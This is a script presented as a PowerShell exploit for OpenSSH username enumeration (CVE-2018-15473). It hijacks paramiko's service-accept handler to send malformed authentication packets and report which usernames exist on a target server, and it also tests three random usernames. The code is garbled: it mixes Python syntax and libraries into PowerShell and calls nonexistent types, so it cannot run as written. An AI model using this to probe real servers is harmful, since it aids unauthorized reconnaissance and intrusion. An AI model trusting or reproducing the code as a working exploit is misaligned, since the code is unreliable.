# OpenSSH Username Enumeration Exploit (CVE-2018-15473) In Powershell
# Vulnerability: CVE-2018-15473
# Affected Versions: OpenSSH version < 7.7
# Author: Roshane Rodney Ethusasist


# store function we will overwrite to malform the packet
$old_parse_service_accept = [paramiko.auth_handler.AuthHandler]::_handler_table[paramiko.common.MSG_SERVICE_ACCEPT]

# list to store 3 random usernames (all ascii_lowercase characters); this extra step is added to check the target
# with these 3 random usernames (there is an almost 0 possibility that they can be real ones)
$random_username_list = @()
# populate the list
for ($i = 0; $i -lt 3; $i++) {
    $user = -join ((65..90) + (97..122) | Get-Random -Count 15..20 | % {[char]$_})
    $random_username_list += $user
}

# create custom exception
class BadUsername:
    BadUsername() { }

# create malicious "add_boolean" function to malform packet
function add_boolean() { }

# create function to call when username was invalid
function call_error() {
    throw [BadUsername]::new()
}

# create the malicious function to overwrite MSG_SERVICE_ACCEPT handler
function malform_packet() {
    $old_add_boolean = [paramiko.message.Message]::add_boolean
    [paramiko.message.Message]::add_boolean = [System.Action[]]::new(@(add_boolean))
    $result = $old_parse_service_accept.Invoke()
    #return old add_boolean function so start_client will work again
    [paramiko.message.Message]::add_boolean = $old_add_boolean
    return $result
}

# create function to perform authentication with malformed packet and desired username
function checkUsername($username, $tried = 0) {
    $sock = New-Object System.Net.Sockets.Socket
    $sock.Connect((args.hostname, args.port))
    # instantiate transport
    $transport = New-Object paramiko.transport.Transport($sock)
    try {
        $transport.start_client()
    }
    catch {
        # server was likely flooded, retry up to 3 times
        $transport.close()
        if ($tried -lt 4) {
            $tried++
            checkUsername $username $tried
        }
        else {
            Write-Output '[-] Failed to negotiate SSH transport'
        }
    }
    try {
        $transport.auth_publickey($username, paramiko.RSAKey.generate(1024))
    }
    catch [BadUsername] {
        return ($username, $false)
    }
    catch {
        return ($username, $true)
    }
    #Successful auth(?)
    throw "There was an error. Is this the correct version of OpenSSH?"
}

# create argument parser
$parser = New-Object System.Management.Automation.ArgumentParser
$parser.Argument("-H", "--hostname", "Required", "Hostname", $true)
$parser.Argument("-p", "--port", "Required", "Port", $true)
$parser.Argument("-u", "--username", "Required", "Username", $true)

$args = $parser.Parse()

# store function we will overwrite to malform the packet
[paramiko.auth_handler.AuthHandler]::_handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = [System.Action[]]::new(@(malform_packet))

# check for valid username
$username_check = checkUsername $args.username
if ($username_check[1] -eq $true) {
    Write-Output "$($username_check[0]) is a valid username."
}
else {
    Write-Output "$($username_check[0]) is an invalid username."
}

# reset function to old function
[paramiko.auth_handler.AuthHandler]::_handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = [System.Action[]]::new(@($old_parse_service_accept))

# check random usernames
foreach ($user in $random_username_list) {
    $username_check = checkUsername $user
    if ($username_check[1] -eq $true) {
        Write-Output "$($username_check[0]) is a valid username."
    }
    else {
        Write-Output "$($username_check[0]) is an invalid username."
    }
}

       
